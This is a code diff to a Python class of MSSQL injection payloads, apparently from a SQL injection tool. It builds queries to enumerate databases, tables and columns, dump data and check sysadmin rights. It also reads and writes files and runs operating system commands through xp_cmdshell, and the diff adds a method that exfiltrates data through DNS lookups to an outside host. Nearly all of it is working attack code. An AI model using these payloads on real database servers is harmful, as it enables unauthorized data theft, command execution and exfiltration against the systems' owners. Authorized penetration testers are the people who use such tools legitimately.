@@ -6,8 +6,9 @@ from typing import List
 
 class MSSQLPayloads:
     name = "mssql"
-    comment = "-- "
+    comment = "--"
     inline_comment = "/*!*/"
+    substitution_char = "s"
 
     @staticmethod
     def version() -> List[str]:
@@ -18,33 +19,33 @@ class MSSQLPayloads:
     @staticmethod
     def databases() -> List[str]:
         return [
-            "SELECT name FROM master..sysdatabases",
-            "SELECT database_id, name FROM sys.databases",
+            "SELECT STRING_AGG(name, ',') FROM sys.databases",
+            "SELECT STUFF((SELECT ',' + name FROM sys.databases FOR XML PATH('')),1,1,'')",
         ]
 
     @staticmethod
     def tables(db: str) -> List[str]:
         return [
-            f"SELECT table_name FROM {db}.information_schema.tables",
-            f"SELECT name FROM {db}..sysobjects WHERE xtype='U'",
+            f"SELECT STRING_AGG(table_name, ',') FROM {db}.information_schema.tables",
+            f"SELECT STUFF((SELECT ',' + table_name FROM {db}.information_schema.tables FOR XML PATH('')),1,1,'')",
         ]
 
     @staticmethod
     def columns(db: str, table: str) -> List[str]:
         return [
-            f"SELECT column_name FROM {db}.information_schema.columns WHERE table_name='{table}'",
+            f"SELECT STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
+            f"SELECT STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name='{table}' FOR XML PATH('')),1,1,'')",
         ]
 
     @staticmethod
     def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
-        q = f"SELECT {column} FROM {db}..{table}"
         if limit > 0:
-            q += f" TOP {limit}"
-        return [q]
+            return [f"SELECT TOP {limit} {column} FROM {db}..{table}"]
+        return [f"SELECT {column} FROM {db}..{table}"]
 
     @staticmethod
     def current_user() -> List[str]:
-        return ["SELECT SYSTEM_USER", "SELECT CURRENT_USER"]
+        return ["SELECT CURRENT_USER", "SELECT SYSTEM_USER"]
 
     @staticmethod
     def current_db() -> List[str]:
@@ -56,7 +57,7 @@ class MSSQLPayloads:
 
     @staticmethod
     def count_columns(db: str, table: str) -> List[str]:
-        return [f"SELECT COUNT(*) FROM {db}.information_schema.columns WHERE table_name='{table}'"]
+        return [f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}'"]
 
     @staticmethod
     def count_rows(db: str, table: str) -> List[str]:
@@ -67,43 +68,38 @@ class MSSQLPayloads:
         return ["SELECT @@version"]
 
     @staticmethod
-    def is_sysadmin() -> List[str]:
-        return ["SELECT IS_SRVROLEMEMBER('sysadmin')"]
+    def is_dba() -> List[str]:
+        return ["SELECT is_srvrolemember('sysadmin')"]
 
     @staticmethod
     def is_admin() -> List[str]:
-        return [
-            "SELECT IS_SRVROLEMEMBER('sysadmin')",
-            "SELECT IS_SRVROLEMEMBER('serveradmin')",
-            "SELECT IS_SRVROLEMEMBER('securityadmin')",
-        ]
+        return ["SELECT is_srvrolemember('sysadmin')"]
 
     @staticmethod
     def privileges() -> List[str]:
-        return [
-            "SELECT r.name AS role, p.name AS principal FROM sys.server_role_members m JOIN sys.server_principals r ON m.role_principal_id=r.principal_id JOIN sys.server_principals p ON m.member_principal_id=p.principal_id WHERE p.name=SYSTEM_USER",
-            "SELECT permission_name, state_desc FROM sys.server_permissions WHERE grantee_principal_id=SUSER_ID(SYSTEM_USER)",
-        ]
-
-    @staticmethod
-    def xp_cmdshell(cmd: str) -> List[str]:
-        return [f"EXEC master..xp_cmdshell '{cmd}'"]
+        return ["SELECT permission_name FROM fn_my_permissions(NULL, 'DATABASE')"]
 
     @staticmethod
     def file_read(path: str) -> List[str]:
         return [
             f"SELECT * FROM OPENROWSET(BULK N'{path}', SINGLE_CLOB) AS data",
-            f"EXEC master..xp_cmdshell 'type {path}'",
         ]
 
     @staticmethod
     def file_write(path: str, content: str) -> List[str]:
+        escaped = content.replace("'", "''")
         return [
-            f"EXEC master..xp_cmdshell 'echo {content} > {path}'",
+            f"EXEC xp_cmdshell 'echo {escaped} > {path}'",
         ]
 
     @staticmethod
     def os_cmd(cmd: str) -> List[str]:
         return [
-            f"EXEC master..xp_cmdshell '{cmd}'",
+            f"EXEC xp_cmdshell '{cmd}'",
+        ]
+
+    @staticmethod
+    def oob_call(target: str, data: str) -> List[str]:
+        return [
+            f"EXEC xp_cmdshell 'nslookup {data}.{target}'",
         ]
